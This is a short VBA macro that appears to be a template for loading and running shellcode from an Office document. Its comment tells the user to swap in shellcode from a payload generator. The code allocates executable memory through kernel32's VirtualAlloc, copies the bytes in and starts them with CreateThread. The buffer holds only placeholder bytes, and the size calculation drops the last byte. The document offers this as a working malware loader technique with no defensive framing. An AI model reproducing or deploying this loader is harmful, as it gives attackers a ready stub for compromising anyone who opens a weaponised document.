' VBA x64 loader. Replace the buffer bytes with the raw shellcode
' (or paste the VBA output of the payload generator directly).
Private Declare PtrSafe Sub RtlMoveMemory Lib "kernel32" (ByVal dest As LongPtr, ByRef src As Any, ByVal n As Long)
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddr As LongPtr, ByVal dwSize As Long, ByVal flAlloc As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpAttr As LongPtr, ByVal dwStack As Long, ByVal lpStart As LongPtr, ByVal lpParam As LongPtr, ByVal dwFlags As Long, ByVal lpId As LongPtr) As LongPtr

Sub RunPayload()
  Dim buf(0 To 2) As Byte
  buf(0) = &H90: buf(1) = &H90: buf(2) = &HCC
  Dim p As LongPtr
  p = VirtualAlloc(0, UBound(buf), &H3000, &H40)
  RtlMoveMemory p, buf(0), UBound(buf)
  CreateThread 0, 0, p, 0, 0, 0
End Sub
